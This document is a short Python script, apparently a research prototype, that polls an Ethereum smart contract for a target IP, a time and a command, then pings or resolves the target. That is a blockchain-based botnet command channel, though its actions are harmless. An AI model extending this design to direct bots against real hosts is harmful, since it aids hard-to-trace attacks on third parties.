#!/usr/bin/python
import time
import random
import socket
from web3 import Web3, HTTPProvider
from ping3 import ping, verbose_ping
from nslookup import Nslookup

contract_address = ["0x6fEd0f6018B55Fdb17970235c4842594d594DEc4"]
# allazei kathe fora poy ginetai deploy to contract.. to allazoume xeirokinhta
w3 = Web3(HTTPProvider("http://127.0.0.1:8545"))
myContract = w3.eth.contract(address='0x6fEd0f6018B55Fdb17970235c4842594d594DEc4', abi=[
    {
        "constant": False,
        "inputs": [
            {
                "name": "_ip_address",
                "type": "string"
            },
            {
                "name": "_time",
                "type": "string"
            },
            {
                "name": "_command",
                "type": "string"
            }
        ],
        "name": "set_target",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function",
        "signature": "0x53e4bc69"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "get_target",
        "outputs": [
            {
                "name": "",
                "type": "string"
            },
            {
                "name": "",
                "type": "string"
            },
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x0c9ce52f"
    }
])

attacks = []


def selection(argument):
    if argument == '1':
        print(ping(myContract.functions.get_target().call()[0]))
    elif argument == '2':
        ip_list = []
        ais = socket.getaddrinfo((myContract.functions.get_target().call()[0]), 0, 0, 0, 0)
        for result in ais:
            ip_list.append(result[-1][0])
        ip_list = list(set(ip_list))
        print(ip_list)
    elif argument == '3':
        print("exiting...")
        exit()
    else:
        print("error.. no such command")


attacks.append('0')
i = 1

while True:
    attacks.append(myContract.functions.get_target().call()[1])

    if attacks[i] > attacks[i - 1]:
        selection(myContract.functions.get_target().call()[2])
    else:
        time.sleep(2)
    i += 1

